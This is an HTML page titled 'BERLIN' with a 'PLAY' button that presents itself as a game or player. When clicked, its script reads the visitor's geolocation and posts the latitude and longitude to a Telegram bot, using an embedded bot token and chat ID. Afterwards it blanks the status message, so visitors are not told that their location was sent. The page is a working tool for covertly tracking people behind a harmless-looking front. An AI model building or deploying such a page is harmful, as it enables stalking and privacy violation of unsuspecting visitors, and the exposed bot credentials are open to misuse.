<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>BERLIN</h1>
    <button onclick="getLocation()">PLAY</button>
    <p id="status"></p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError);
            } else {
                document.getElementById("status").textContent = "Geolocation is not supported by this browser.";
            }
        }

        function sendLocation(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            document.getElementById("status").textContent = "Sending location...";

            var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
            var chatId = '5112680061'; // Replace with your chat ID
            var message = `Location: Latitude ${latitude}, Longitude ${longitude}`;

            var url = `https://api.telegram.org/bot${token}/sendMessage`;

            var data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                if (data.ok) {
                    document.getElementById("status").textContent = "";
                } else {
                    document.getElementById("status").textContent = "Faild: " + data.description;
                }
            })
            .catch(error => {
                document.getElementById("status").textContent = "Error sending: " + error.message;
                console.error('Error:', error);
            });
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("status").textContent = "User denied the request";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("status").textContent = "information is unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("status").textContent = "The request to get user timeout .";
                    break;
                case error.UNKNOWN_ERROR:
                    document.getElementById("status").textContent = "An unknown error occurred.";
                    break;
            }
        }
    </script>
</body>
</html>
